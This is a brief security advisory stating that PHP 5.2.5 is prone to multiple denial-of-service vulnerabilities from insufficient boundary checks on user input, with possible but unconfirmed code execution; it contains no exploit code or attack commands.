PHP is prone to multiple denial-of-service vulnerabilities because it fails to perform adequate boundary checks on user-supplied input.

Attackers can exploit these issues to cause denial-of-service conditions. Given the nature of these issues, attackers may also be able to execute arbitrary code, but this has not been confirmed.

PHP 5.2.5 is vulnerable; other versions may also be affected.
